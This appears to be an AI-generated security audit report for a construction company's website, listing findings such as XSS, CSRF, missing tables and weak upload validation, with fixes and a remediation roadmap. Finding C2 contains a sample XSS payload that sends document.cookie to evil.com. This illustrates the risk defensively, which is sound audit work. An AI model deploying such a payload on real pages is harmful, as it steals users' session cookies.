# Comprehensive Security & Code Audit Report
## Ascent Group Construction Website
**Date**: 2025-10-07  
**Branch**: feature/full-audit-admin-overhaul  
**Site**: https://ascent-build-bright.lovable.app

---

## Executive Summary

**Overall Status**: 🟡 MEDIUM RISK  
**Critical Issues**: 2  
**High Issues**: 3  
**Medium Issues**: 5  
**Low Issues**: 8  

### Quick Wins
- ✅ No client-side admin credential storage detected
- ✅ Proper RLS policies exist for user roles
- ✅ Zod validation in place for auth forms
- ✅ CORS headers properly configured on edge functions

### Critical Blockers
1. **Missing Database Tables** - Articles and Projects tables don't exist
2. **XSS Vulnerability** - BlogPost.tsx uses dangerouslySetInnerHTML without sanitization

---

## CRITICAL FINDINGS (P0 - Immediate Action Required)

### C1: Missing Database Tables
**Severity**: 🔴 CRITICAL  
**Risk**: Edge functions fail, admin features non-functional  
**Impact**: High - Core CMS features broken

**Evidence**:
```
Error: Could not find the table 'public.projects' in the schema cache
Error: Could not find the table 'public.articles' in the schema cache
```

**Affected Code**:
- `supabase/functions/projects-public/index.ts` (lines 26-31, 55-59)
- `supabase/functions/articles-crud/index.ts` (lines 47-49, 73-77)
- `supabase/functions/articles-public/index.ts` (lines 26-30, 55-59)

**Fix Required**:
Create missing database tables with proper RLS policies:
- `articles` table (id, slug, title, body, excerpt, status, author_id, etc.)
- `article_versions` table (for version control)
- `projects` table (id, slug, title, description, images, status, etc.)
- `services` table (id, title, description, features, etc.)
- `media` table (id, filename, url, storage_path, etc.)

**Priority**: IMMEDIATE - Block merge until resolved

---

### C2: XSS Vulnerability via dangerouslySetInnerHTML
**Severity**: 🔴 CRITICAL  
**Risk**: Cross-Site Scripting (XSS) attack vector  
**Impact**: High - Allows arbitrary JavaScript execution

**Affected Code**:
```tsx
// src/pages/BlogPost.tsx:195
<div 
  className="prose prose-lg max-w-none"
  dangerouslySetInnerHTML={{ __html: formatContent(post.content) }}
/>
```

**Attack Vector**:
If blog content contains malicious script:
```html
<script>
  // Steal cookies, redirect, keylog, etc.
  fetch('https://evil.com?cookie=' + document.cookie);
</script>
```

**Fix Required**:
1. Install DOMPurify: `npm install dompurify @types/dompurify`
2. Sanitize HTML before rendering:
```tsx
import DOMPurify from 'dompurify';

<div 
  className="prose prose-lg max-w-none"
  dangerouslySetInnerHTML={{ 
    __html: DOMPurify.sanitize(formatContent(post.content)) 
  }}
/>
```

**Priority**: IMMEDIATE - Security risk

---

## HIGH PRIORITY FINDINGS (P1 - Fix Before Merge)

### H1: Weak Password Protection Disabled
**Severity**: 🟠 HIGH  
**Risk**: Users can set weak/compromised passwords  
**Source**: Supabase Linter WARN 1

**Evidence**:
```
WARN: Leaked password protection is currently disabled
```

**Fix Required**:
Enable password strength & leaked password protection in Supabase auth settings.

**Priority**: HIGH - Security best practice

---

### H2: No Input Sanitization for Contact/Estimate Forms
**Severity**: 🟠 HIGH  
**Risk**: SQL injection (mitigated by Supabase client), data corruption  
**Impact**: Medium - Could corrupt database or cause DoS

**Affected Code**:
- `supabase/functions/submit-contact/index.ts`
- `supabase/functions/submit-estimate/index.ts`

**Current State**: Forms use basic validation but no strict length limits or character filters

**Fix Required**:
Add comprehensive Zod schemas with:
- Max length limits (name: 100, email: 255, message: 2000)
- Character whitelisting/blacklisting
- XSS-prone pattern detection (script tags, event handlers)

**Priority**: HIGH - Data integrity

---

### H3: Missing CSRF Protection on State-Changing Endpoints
**Severity**: 🟠 HIGH  
**Risk**: Cross-Site Request Forgery  
**Impact**: Medium - Attackers could forge admin actions

**Affected Endpoints**:
- `articles-crud` (POST, PUT, DELETE)
- `media-crud` (POST, PUT, DELETE)
- `services-crud` (POST, PUT, DELETE)

**Fix Required**:
1. Implement CSRF tokens using `crypto.randomUUID()`
2. Validate tokens on all state-changing operations
3. Set SameSite=Strict on session cookies

**Priority**: HIGH - OWASP Top 10

---

## MEDIUM PRIORITY FINDINGS (P2 - Plan Upgrade)

### M1: No Rate Limiting on Public Edge Functions
**Severity**: 🟡 MEDIUM  
**Risk**: DoS attacks, API abuse  
**Impact**: Low-Medium - Could exhaust resources

**Affected**:
- `articles-public/index.ts`
- `projects-public/index.ts`
- `submit-contact/index.ts`

**Fix Required**:
Implement IP-based rate limiting:
```typescript
const RATE_LIMIT = 100; // requests per hour
const rateLimitKey = `ratelimit:${ipAddress}:${hour}`;
```

**Priority**: MEDIUM - Operational stability

---

### M2: Missing Image Upload Validation
**Severity**: 🟡 MEDIUM  
**Risk**: Malicious file upload, storage abuse  
**Impact**: Medium - Could upload PHP shells, exe files disguised as images

**Affected Code**:
```tsx
// src/pages/admin/MediaLibrary.tsx:161-166
accept: {
  'image/*': ['.png', '.jpg', '.jpeg', '.gif', '.webp', '.svg'],
}
```

**Current Issue**: Client-side validation only (easily bypassed)

**Fix Required**:
Server-side validation in `media-presign`:
1. Check magic bytes (not just extension)
2. Reject executables, scripts, archives
3. Scan with ClamAV or similar (optional)
4. Enforce max file size (e.g., 10MB)

**Priority**: MEDIUM - Security defense in depth

---

### M3: Deprecated Deno std Library
**Severity**: 🟡 MEDIUM  
**Risk**: Unpatched vulnerabilities  
**Impact**: Low - Unlikely but possible

**Affected Code**:
```typescript
// All edge functions
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
```

**Current Version**: 0.168.0 (Released 2023)  
**Latest Version**: 0.224.0+ (2025)

**Fix Required**:
Update all edge functions to latest Deno std:
```typescript
import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
```

**Priority**: MEDIUM - Maintenance

---

### M4: No Audit Log Querying in UI
**Severity**: 🟡 MEDIUM  
**Risk**: Inability to investigate security incidents  
**Impact**: Low - Audit logs exist but not accessible

**Current State**:
- `audit_logs` table exists ✅
- Logs inserted on CRUD operations ✅
- No admin UI to view/search logs ❌

**Fix Required**:
Create admin page `/admin/audit` with:
- Searchable table (by user, action, resource)
- Date range filtering
- CSV export
- Real-time updates

**Priority**: MEDIUM - Compliance & forensics

---

### M5: Missing Environment-Specific Configs
**Severity**: 🟡 MEDIUM  
**Risk**: Production issues, debugging difficulty  
**Impact**: Low - Operational

**Current Issue**:
- Single config for dev/staging/prod
- No feature flags
- Console logs in production

**Fix Required**:
1. Add `NODE_ENV` checks
2. Conditional logging:
```typescript
const log = import.meta.env.DEV ? console.log : () => {};
```
3. Feature flags table for gradual rollouts

**Priority**: MEDIUM - Best practice

---

## LOW PRIORITY FINDINGS (P3 - Future Improvements)

### L1: No Sitemap Generation on Publish
**Severity**: 🟢 LOW  
**Impact**: SEO - Static sitemap.xml will become stale

**Fix**: Generate sitemap.xml on article/project publish

---

### L2: No Image Optimization Pipeline
**Severity**: 🟢 LOW  
**Impact**: Performance - Large images slow FCP/LCP

**Fix**: Add Sharp middleware to generate thumbnails & WebP

---

### L3: Missing API Versioning
**Severity**: 🟢 LOW  
**Impact**: Maintenance - Breaking changes affect all clients

**Fix**: Implement `/v1/`, `/v2/` prefixes

---

### L4: No TypeScript Strict Mode
**Severity**: 🟢 LOW  
**Impact**: Code quality - Type safety

**Fix**: Enable `"strict": true` in tsconfig.json

---

### L5: Unused Dependencies
**Severity**: 🟢 LOW  
**Impact**: Bundle size

**Identified**:
- `sharp` (installed but unused - see package.json)
- `terser` (Vite uses esbuild)

**Fix**: Run `npm prune` & remove from package.json

---

### L6: No Accessibility Tests
**Severity**: 🟢 LOW  
**Impact**: Compliance - WCAG violations

**Fix**: Add axe-core to Playwright tests

---

### L7: Missing E2E for Admin Publish Flow
**Severity**: 🟢 LOW  
**Impact**: Testing - Core flow not covered

**Fix**: Add test: Create Article → Publish → Verify on public endpoint

---

### L8: No RSS Feed
**Severity**: 🟢 LOW  
**Impact**: UX - Users can't subscribe

**Fix**: Generate RSS on article publish

---

## PERFORMANCE FINDINGS

### P1: No Caching on Public Endpoints
**Current**: Every request hits database  
**Fix**: Add Cache-Control headers:
```typescript
headers: {
  ...corsHeaders,
  'Cache-Control': 'public, max-age=300, s-maxage=600',
}
```

### P2: N+1 Query Pattern
**Location**: Articles list fetches author in loop  
**Fix**: Use Supabase joins (already doing this ✅)

### P3: Missing Image Lazy Loading
**Fix**: Add `loading="lazy"` to `<img>` tags

---

## COMPLIANCE & DOCUMENTATION

### Missing Documentation
- [ ] API documentation (endpoints, auth, schemas)
- [ ] Runbook for incidents
- [ ] Disaster recovery plan
- [ ] Data retention policy

### Recommended Additions
1. **CHANGELOG.md** - Track user-facing changes
2. **SECURITY.md** - Vulnerability disclosure policy
3. **CONTRIBUTING.md** - Admin onboarding guide

---

## DATABASE SCHEMA REQUIRED

### Tables to Create
1. **articles** - Blog posts
2. **article_versions** - Version history
3. **projects** - Portfolio items
4. **services** - Service offerings
5. **media** - Media library

See `MIGRATION_PLAN.md` for full DDL

---

## TESTING GAPS

### Missing Tests
- ❌ E2E: Admin login → Create article → Publish → Public view
- ❌ Unit: DOMPurify sanitization
- ❌ Integration: Edge function error handling
- ❌ Security: OWASP ZAP scan results
- ❌ Accessibility: axe-core violations

### Existing Tests
- ✅ Splash overlay E2E
- ✅ Unit: SplashOverlay.test.tsx

---

## REMEDIATION ROADMAP

### Phase 1: Critical Fixes (Days 1-2)
1. ✅ Create database migrations for missing tables
2. ✅ Add DOMPurify to BlogPost.tsx
3. ✅ Enable password protection in Supabase auth
4. ✅ Update Deno std to latest

### Phase 2: High Priority (Days 3-5)
1. Add CSRF protection
2. Server-side file upload validation
3. Comprehensive form validation schemas
4. Rate limiting middleware

### Phase 3: Medium Priority (Days 6-8)
1. Audit log UI
2. Image optimization pipeline
3. Sitemap/RSS generation
4. Environment configs & feature flags

### Phase 4: Low Priority (Days 9-11)
1. API versioning
2. Accessibility tests
3. Performance optimizations
4. Documentation

### Phase 5: Testing & Validation (Day 12)
1. Run OWASP ZAP scan
2. E2E test suite
3. Security re-scan
4. Demo recording

---

## ACCEPTANCE CRITERIA

- [ ] All CRITICAL issues resolved
- [ ] All HIGH issues resolved or mitigated
- [ ] Database migrations applied successfully
- [ ] E2E tests pass for core admin flows
- [ ] OWASP ZAP scan shows no Critical/High vulnerabilities
- [ ] Documentation updated
- [ ] Demo GIF/video recorded

---

## ARTIFACTS LOCATION

All scan results, test reports, and screenshots will be saved to:
```
artifacts/
├── eslint.json
├── npm-audit.json
├── playwright-report/
├── zap-report.html
└── security-scan-before.json
```

---

## NEXT STEPS

1. **Review this report** with team
2. **Approve database migrations** (backup required)
3. **Begin Phase 1** critical fixes
4. **Daily standup** to track progress
5. **Final security scan** before merge

---

**Report Generated**: 2025-10-07  
**Auditor**: Lovable AI  
**Review Status**: PENDING APPROVAL
